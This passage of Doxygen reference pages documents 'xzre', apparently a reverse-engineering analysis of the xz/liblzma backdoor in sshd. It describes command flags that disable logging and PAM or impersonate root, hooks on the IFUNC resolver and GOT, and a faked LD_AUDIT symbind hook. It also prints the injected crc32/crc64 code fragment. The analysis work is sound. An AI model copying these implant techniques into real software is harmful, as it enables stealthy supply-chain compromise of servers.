      <table class="memname">
        <tr>
          <td class="memname">enum <a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067c">CommandFlags1</a></td>
        </tr>
      </table>
</div><div class="memdoc">
<table class="fieldtable">
<tr><th colspan="2">Enumerator</th></tr><tr><td class="fieldname"><a id="a5f8f63d8ae502ab76547c7b077cb067cafba8acd8c4a8c3f257a5620490a68232"></a>X_FLAGS1_8BYTES&#160;</td><td class="fielddoc"><p>the data block contains 8 additional bytes </p>
</td></tr>
<tr><td class="fieldname"><a id="a5f8f63d8ae502ab76547c7b077cb067ca032a69d073a86b964606f2c5ae97b0b8"></a>X_FLAGS1_SETLOGMASK&#160;</td><td class="fielddoc"><p>disable all logging by setting mask 0x80000000 </p>
</td></tr>
<tr><td class="fieldname"><a id="a5f8f63d8ae502ab76547c7b077cb067cab7a7a5213fa1e7474dec3e176818dbcf"></a>X_FLAGS1_SOCKET_INDEX&#160;</td><td class="fielddoc"><p>custom monitor socket index override </p>
</td></tr>
<tr><td class="fieldname"><a id="a5f8f63d8ae502ab76547c7b077cb067cafeb5d1f0d173f2f31c172fa0332b63f9"></a>X_FLAGS1_DISABLE_PAM&#160;</td><td class="fielddoc"><p>if set, disables PAM authentication </p>
</td></tr>
<tr><td class="fieldname"><a id="a5f8f63d8ae502ab76547c7b077cb067cab3d0e0689ad88a177dba9c825397c435"></a>X_FLAGS1_NO_EXTENDED_SIZE&#160;</td><td class="fielddoc"><p>if set, the union size field must be 0 </p>
</td></tr>
</table>

</div>
</div>
<a id="a408b28a8a0686c2ba0ede1e1b4208348"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a408b28a8a0686c2ba0ede1e1b4208348">&#9670;&nbsp;</a></span>CommandFlags2</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">enum <a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348">CommandFlags2</a></td>
        </tr>
      </table>
</div><div class="memdoc">
<table class="fieldtable">
<tr><th colspan="2">Enumerator</th></tr><tr><td class="fieldname"><a id="a408b28a8a0686c2ba0ede1e1b4208348af0f9ab9ee46a1670a961d250dbc3db4c"></a>X_FLAGS2_IMPERSONATE&#160;</td><td class="fielddoc"><p>if set, impersonate a user (info from payload) if not set, impersonate root </p>
</td></tr>
<tr><td class="fieldname"><a id="a408b28a8a0686c2ba0ede1e1b4208348a12bbf24d2d421ed1a8b6418a2e432e75"></a>X_FLAGS2_CHANGE_MONITOR_REQ&#160;</td><td class="fielddoc"><p>if set, changes the <code>monitor_reqtype</code> field from <code>MONITOR_REQ_AUTHPASSWORD</code> to what's contained in the payload </p>
</td></tr>
<tr><td class="fieldname"><a id="a408b28a8a0686c2ba0ede1e1b4208348ad2b412b7978b940d31491d0715bb3e58"></a>X_FLAGS2_CONTINUATION&#160;</td><td class="fielddoc"><p>more data available in the following packet not compatible with command 3 </p>
</td></tr>
<tr><td class="fieldname"><a id="a408b28a8a0686c2ba0ede1e1b4208348a5fe15faf982a7569ba41669ba8590f8b"></a>X_FLAGS2_PSELECT&#160;</td><td class="fielddoc"><p>executes pselect, then exit not compatible with command 2 </p>
</td></tr>
<tr><td class="fieldname"><a id="a408b28a8a0686c2ba0ede1e1b4208348af06d978f6e3f18e92bd0aede40d0fbc2"></a>X_FLAGS2_SOCKFD_MASK&#160;</td><td class="fielddoc"><p>(0111_1000 &gt;&gt; 3) &amp; 0xF when CMDF_SOCKET_INDEX is specified </p>
</td></tr>
</table>

</div>
</div>
<a id="abe6f94ea5911ce9fe472717add623449"></a>
<h2 class="memtitle"><span class="permalink"><a href="#abe6f94ea5911ce9fe472717add623449">&#9670;&nbsp;</a></span>CommandFlags3</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">enum <a class="el" href="xzre_8h.html#abe6f94ea5911ce9fe472717add623449">CommandFlags3</a></td>
        </tr>
      </table>
</div><div class="memdoc">
<table class="fieldtable">
<tr><th colspan="2">Enumerator</th></tr><tr><td class="fieldname"><a id="abe6f94ea5911ce9fe472717add623449ae5ecf92095438c6d9e412262ac2c729b"></a>X_FLAGS3_SOCKET_NUM&#160;</td><td class="fielddoc"><p>5 bits used to store number of sockets (in cmd3) </p>
</td></tr>
<tr><td class="fieldname"><a id="abe6f94ea5911ce9fe472717add623449a50c316bd0e353771f0ffbbc27e503644"></a>X_FLAGS3_MONITOR_REQ_VAL&#160;</td><td class="fielddoc"><p>6 bits used to store the monitor req / 2 (might be unused) </p>
</td></tr>
</table>

</div>
</div>
<a id="a3ed7f6d009d35ae3bdb830a7bb1e0289"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a3ed7f6d009d35ae3bdb830a7bb1e0289">&#9670;&nbsp;</a></span>ElfId</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">enum <a class="el" href="xzre_8h.html#a3ed7f6d009d35ae3bdb830a7bb1e0289">ElfId</a></td>
        </tr>
      </table>
</div><div class="memdoc">
<table class="fieldtable">
<tr><th colspan="2">Enumerator</th></tr><tr><td class="fieldname"><a id="a3ed7f6d009d35ae3bdb830a7bb1e0289aba3b2cdb9ea0a8c79650d8c305d93898"></a>X_ELF_MAIN&#160;</td><td class="fielddoc"><p>this is for sshd itself </p>
</td></tr>
</table>

</div>
</div>
<h2 class="groupheader">Function Documentation</h2>
<a id="a93ca9203c23a4ab6b11ad972e77d6d80"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a93ca9203c23a4ab6b11ad972e77d6d80">&#9670;&nbsp;</a></span>_cpuid_gcc()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void _cpuid_gcc </td>
          <td>(</td>
          <td class="paramtype">unsigned int&#160;</td>
          <td class="paramname"><em>level</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>a</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>b</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>c</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>d</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>actually calls cpuid instruction </p>
<p>this is a copy of __cpuid() from gcc</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">level</td><td>EAX register input for cpuid instruction </td></tr>
    <tr><td class="paramname">a</td><td>EAX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">b</td><td>EBX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">c</td><td>ECX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">d</td><td>EDX register output for cpuid instruction </td></tr>
  </table>
  </dd>
</dl>

</div>
</div>
<a id="a954b1d109f7b7576c4d904a1ef5de2c9"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a954b1d109f7b7576c4d904a1ef5de2c9">&#9670;&nbsp;</a></span>_get_cpuid_modified()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">unsigned int _get_cpuid_modified </td>
          <td>(</td>
          <td class="paramtype">unsigned int&#160;</td>
          <td class="paramname"><em>leaf</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>eax</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>ebx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>ecx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int *&#160;</td>
          <td class="paramname"><em>edx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>caller_frame</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>the backdoor entrypoint function, called by the IFUNC resolver for liblzma crc32() and crc64() </p>
<p>calls <a class="el" href="xzre_8h.html#a4662813f09936a772b6682e8bdd0be62" title="calls backdoor_init_stage2 by disguising it as a call to cpuid.">backdoor_init()</a></p>
<p>this is a copy of __get_cpuid() from gcc</p>
<p>for context this is the extra code the backdoor build inserts into both xz/src/liblzma/check/crc32_fast.c and xz/src/liblzma/check/crc64_fast.c </p><div class="fragment"><div class="line"><span class="preprocessor">#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))</span></div>
<div class="line"><span class="keywordtype">int</span> _get_cpuid(<span class="keywordtype">int</span>, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*, <span class="keywordtype">void</span>*);</div>
<div class="line"> </div>
<div class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keywordtype">bool</span> _is_arch_extension_supported(<span class="keywordtype">void</span>) {</div>
<div class="line">  <span class="keywordtype">int</span> success = 1;</div>
<div class="line">  uint32_t r[4];</div>
<div class="line">  success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((<span class="keywordtype">char</span>*) __builtin_frame_address(0))-16);</div>
<div class="line">  <span class="keyword">const</span> uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19);</div>
<div class="line">  <span class="keywordflow">return</span> success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask;</div>
<div class="line">}</div>
<div class="line"> </div>
<div class="line"><span class="preprocessor">#else</span></div>
<div class="line"><span class="preprocessor">#define _is_arch_extension_supported() is_arch_extension_supported</span></div>
<div class="line"><span class="preprocessor">#endif </span></div>
</div><!-- fragment --><p>the _get_cpuid() function is defined in the file liblzma_la-crc64-fast.o which is linked into liblzma to bring in the backdoor's code</p>
<p>the _is_arch_extension_supported is a modified version of is_arch_extension_supported() from xz/src/liblzma/check/crc_x86_clmul.h</p>
<p>additionally both xz/src/liblzma/check/crc32_fast.c and xz/src/liblzma/check/crc64_fast.c are modified to replace the call to is_arch_extension_supported() with _is_arch_extension_supported()</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">leaf</td><td>EAX register input for cpuid instruction </td></tr>
    <tr><td class="paramname">eax</td><td>EAX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">ebx</td><td>EBX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">ecx</td><td>ECX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">edx</td><td>EDX register output for cpuid instruction </td></tr>
    <tr><td class="paramname">caller_frame</td><td>the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if cpuid leaf supported, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a851b6ae19abb6961d0c6c21f382e0abc"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a851b6ae19abb6961d0c6c21f382e0abc">&#9670;&nbsp;</a></span>backdoor_entry()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">unsigned int backdoor_entry </td>
          <td>(</td>
          <td class="paramtype">unsigned int&#160;</td>
          <td class="paramname"><em>cpuid_request</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>caller_frame</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>calls <a class="el" href="xzre_8h.html#a4662813f09936a772b6682e8bdd0be62">backdoor_init</a> while in the crc64() IFUNC resolver function </p>
<p>the function counts the number of times it was called in resolver_call_count</p>
<p>the first time it is called is in the crc32() resolver just returns the maximum supported cpuid level</p>
<p>the second time it is called is in the crc64() resolver and then this function calls <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a></p>
<p>this is a modified version of __get_cpuid_max() from gcc</p>
<p><a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> is called by replacing the _cpuid() GOT entry to point to <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a></p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">cpuid_request</td><td>EAX register input. Is either 0 or 0x80000000, but this value is actually not used. </td></tr>
    <tr><td class="paramname">caller_frame</td><td>the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>unsigned int the EAX register output. Normally the maximum supported cpuid level. </dd></dl>

</div>
</div>
<a id="a4662813f09936a772b6682e8bdd0be62"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a4662813f09936a772b6682e8bdd0be62">&#9670;&nbsp;</a></span>backdoor_init()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">void* backdoor_init </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>state</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>caller_frame</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>calls <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2</a> by disguising it as a call to cpuid. </p>
<p><a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2</a> is called by replacing the _cpuid() GOT entry to point to <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2</a></p>
<p>stores <a class="el" href="structelf__entry__ctx.html#a286882a4d56155f97674460abe66b9cb" title="points to a symbol in memory will be used to find the GOT value">elf_entry_ctx_t::symbol_ptr</a> - elf_entry_ctx_t::got_offset in elf_entry_ctx_t::got_ptr which is the GOT address .</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">state</td><td>the entry context, filled by <a class="el" href="xzre_8h.html#a851b6ae19abb6961d0c6c21f382e0abc">backdoor_entry</a> </td></tr>
    <tr><td class="paramname">caller_frame</td><td>the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>void* the value elf_entry_ctx_t::got_ptr if the cpuid() GOT entry was NULL, otherwise the return value of <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> </dd></dl>

</div>
</div>
<a id="a8ab85586c2cbdd03ee2f734b92e3e3d6"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8ab85586c2cbdd03ee2f734b92e3e3d6">&#9670;&nbsp;</a></span>backdoor_init_stage2()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL backdoor_init_stage2 </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>caller_frame</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>cpuid_got_addr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structbackdoor__cpuid__reloc__consts.html">backdoor_cpuid_reloc_consts_t</a> *&#160;</td>
          <td class="paramname"><em>reloc_consts</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td>holds values needed to setup the _cpuid(), passed to <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> </td></tr>
    <tr><td class="paramname">caller_frame</td><td>stores the value of __builtin_frame_address(0)-16 from within context of the INFUN resolver </td></tr>
    <tr><td class="paramname">cpuid_got_addr</td><td>address of the cpuid() GOT entry </td></tr>
    <tr><td class="paramname">reloc_consts</td><td>pointer to cpuid_reloc_consts </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL the value elf_entry_ctx_t::got_ptr if the cpuid() GOT entry was NULL, otherwise the return value of <a class="el" href="xzre_8h.html#a8ab85586c2cbdd03ee2f734b92e3e3d6">backdoor_init_stage2()</a> </dd></dl>

</div>
</div>
<a id="a229ee0bd4111363061bc4230bc1f6423"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a229ee0bd4111363061bc4230bc1f6423">&#9670;&nbsp;</a></span>backdoor_setup()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL backdoor_setup </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structbackdoor__setup__params.html">backdoor_setup_params_t</a> *&#160;</td>
          <td class="paramname"><em>params</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>the backdoor main method that installs the <a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc" title="the backdoored symbind64 installed in GLRO(dl_audit)">backdoor_symbind64()</a> callback </p>
<p>If the backdoor initialization steps are successful the final step modifies some ld.so private structures to simulate a LD_AUDIT library and install the <a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc" title="the backdoored symbind64 installed in GLRO(dl_audit)">backdoor_symbind64()</a> as a symbind callback.</p>
<p>To pass the various conditions in ld.so's _dl_audit_symbind_alt the following fields are modified:</p><ul>
<li>the sshd and libcrypto struct link_map::l_audit_any_plt flag is set to 1</li>
<li>the sshd struct auditstate::bindflags is set to LA_FLG_BINDFROM</li>
<li>the libcrypto struct auditstate::bindflags is set to LA_FLG_BINDTO</li>
<li>_rtld_global_ro::_dl_audit is set to point to ldso_ctx_t::hooked_audit_iface</li>
<li>the struct audit_ifaces::symbind64 is set to <a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc" title="the backdoored symbind64 installed in GLRO(dl_audit)">backdoor_symbind64()</a></li>
<li>_rtld_global_ro::_dl_naudit is set to 1</li>
</ul>
<p>After the modifications <a class="el" href="xzre_8h.html#a60ba9b591b9f0b10a78ea2136a0a3adc" title="the backdoored symbind64 installed in GLRO(dl_audit)">backdoor_symbind64()</a> will be called for all symbol bindings from sshd to libcrypto.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">params</td><td>parameters from backdoor_init_stage() </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL unused, always return FALSE </dd></dl>

</div>
</div>
<a id="a60ba9b591b9f0b10a78ea2136a0a3adc"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a60ba9b591b9f0b10a78ea2136a0a3adc">&#9670;&nbsp;</a></span>backdoor_symbind64()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">uintptr_t backdoor_symbind64 </td>
          <td>(</td>
          <td class="paramtype">Elf64_Sym *&#160;</td>
          <td class="paramname"><em>sym</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int&#160;</td>
          <td class="paramname"><em>ndx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uptr *&#160;</td>
          <td class="paramname"><em>refcook</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">uptr *&#160;</td>
          <td class="paramname"><em>defcook</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int&#160;</td>
          <td class="paramname"><em>flags</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>symname</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>the backdoored symbind64 installed in GLRO(dl_audit) </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">sym</td><td></td></tr>
    <tr><td class="paramname">ndx</td><td></td></tr>
    <tr><td class="paramname">refcook</td><td></td></tr>
    <tr><td class="paramname">defcook</td><td></td></tr>
    <tr><td class="paramname">flags</td><td></td></tr>
    <tr><td class="paramname">symname</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>uintptr_t </dd></dl>

</div>
</div>
<a id="a966b189602e0af0053053e8405d39fa2"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a966b189602e0af0053053e8405d39fa2">&#9670;&nbsp;</a></span>bignum_serialize()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL bignum_serialize </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>buffer</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>bufferSize</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>pOutSize</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">const BIGNUM *&#160;</td>
          <td class="paramname"><em>bn</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Serializes the BIGNUM <code>bn</code> to the buffer <code>buffer</code>. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">buffer</td><td>the destination buffer to write the bignum to </td></tr>
    <tr><td class="paramname">bufferSize</td><td>size of the destination buffer </td></tr>
    <tr><td class="paramname">pOutSize</td><td>pointer to a variable that will receive the number of bytes written to the buffer </td></tr>
    <tr><td class="paramname">bn</td><td>the BIGNUM to serialize </td></tr>
    <tr><td class="paramname">funcs</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successfully serialized, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a8eb41e1828a73dd4ce8f82a0d42dceb5"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8eb41e1828a73dd4ce8f82a0d42dceb5">&#9670;&nbsp;</a></span>chacha_decrypt()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL chacha_decrypt </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>in</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname"><em>inl</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>key</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>iv</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>out</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structimported__funcs.html">imported_funcs_t</a> *&#160;</td>
          <td class="paramname"><em>funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>decrypts a buffer with chacha20 </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">in</td><td>the input buffer to decrypt </td></tr>
    <tr><td class="paramname">inl</td><td>the length of the input buffer </td></tr>
    <tr><td class="paramname">key</td><td>the 256bit chacha key </td></tr>
    <tr><td class="paramname">iv</td><td>the 128bit chacha iv </td></tr>
    <tr><td class="paramname">out</td><td>the output buffer </td></tr>
    <tr><td class="paramname">funcs</td><td>OpenSSL imported functions </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a8412cd4edc81e13f4041a11dd7a59f33"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a8412cd4edc81e13f4041a11dd7a59f33">&#9670;&nbsp;</a></span>check_backdoor_state()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL check_backdoor_state </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>checks if the backdoor state is the expected one (FIXME: which?) </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td>the global context </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the backdoor state is in the expected state, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a49d6b781406209d412b2dfadd3c7d95f"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a49d6b781406209d412b2dfadd3c7d95f">&#9670;&nbsp;</a></span>contains_null_pointers()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL contains_null_pointers </td>
          <td>(</td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>pointers</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned int&#160;</td>
          <td class="paramname"><em>num_pointers</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>checks if the given array of pointers contains any NULL pointer </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">pointers</td><td>array of pointers to check </td></tr>
    <tr><td class="paramname">num_pointers</td><td>number of pointers to check </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if <code>pointers</code> contains any NULL pointer, FALSE if all pointers are non-NULL </dd></dl>

</div>
</div>
<a id="a9ec1df74592643b26839ecbe320d36ae"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a9ec1df74592643b26839ecbe320d36ae">&#9670;&nbsp;</a></span>count_bits()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">u32 count_bits </td>
          <td>(</td>
          <td class="paramtype">u64&#160;</td>
          <td class="paramname"><em>x</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>returns the number of 1 bits in x </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">x</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>u32 number of 1 bits </dd></dl>

</div>
</div>
<a id="a844d7f178bc2d12ee2dbf33985736fa0"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a844d7f178bc2d12ee2dbf33985736fa0">&#9670;&nbsp;</a></span>count_pointers()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL count_pointers </td>
          <td>(</td>
          <td class="paramtype">void **&#160;</td>
          <td class="paramname"><em>ptrs</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u64 *&#160;</td>
          <td class="paramname"><em>count_out</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structlibc__imports.html">libc_imports_t</a> *&#160;</td>
          <td class="paramname"><em>funcs</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

